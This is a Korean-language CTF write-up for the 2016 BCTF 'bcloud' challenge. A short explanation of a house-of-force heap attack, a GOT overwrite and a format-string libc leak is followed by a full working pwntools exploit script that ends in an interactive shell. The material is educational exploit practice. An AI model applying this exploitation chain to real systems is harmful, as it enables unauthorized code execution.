---
title: "2016 BCTF bcloud"
date: 2020-3-6
ctf: BCTF
layout: post
published : false
---

처음에 name 입력받을 때 꽉채워버리면 heap주소가 붙어있어서 leak해줄 수 있고 바로 뒤에 orgs를 꽉채우고 host에 0xffffffff를 보내면 topchunk를 덮어버릴 수 있다.`house of force` 취약점으로 atoi@got를 printf@plt로 덮어서 fsb로 libc leak 해주고 또 printf를 system함수로 덮고 인자로 /bin/sh\x00 넘기면 쉘 딸 수 있다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./bcloud')
p = process('./bcloud')
libc = e.libc
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
content = 0x0804B0A0
orgs = 0x0804B0C8
names = 0x0804B0CC
idk = 0x804B0E0
note = 0x0804B120
hosts = 0x0804B148

def create(size,content,mode='1'):
	sla('>>','1')
	sla(':\n',str(size))
	if mode == '0':
		sa(':\n',content)

def edit(idx,content):
	sla('>>','3')
	sla(':\n',str(idx))
	sla(':\n',content)

def delete(idx):
	sla('>>','4')
	sla(':\n',str(idx))

def syn():
	sla('>>','5')

def quit():
	sla('>>','6')

sa('Input your name:\n','A'*64) # names
p.recvuntil('A'*64)
heap = u32(p.recv(4))
log.info('heap leak : {}'.format(hex(heap)))
topchunk = heap + 0xd8

sa('Org:\n','B'*64)
sla('Host:\n',p32(0xffffffff))

hof = e.got['atoi'] - topchunk - 0xc
create(hof,'AAAA')
create(8,'A'*4+p32(e.plt['printf']),mode='0') # atoi@got -> printf@plt

p.sendlineafter('>>','%p.%p.%p!%p.%p')
p.recvuntil('!')
stdout = int(p.recv(10),16) # _IO_2_1_stdout_
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
log.info('libc_base : {}'.format(hex(libc_base)))

p.sendlineafter('>>','333')
sla(':\n','1')
sla(':\n','AAAA'+p32(libc_base + libc.symbols['system']))
p.sendlineafter('>>','/bin/sh\x00')

p.interactive()
```

<br />

## Reference

https://www.lazenca.net/display/TEC/The+House+of+Force

https://github.com/shellphish/how2heap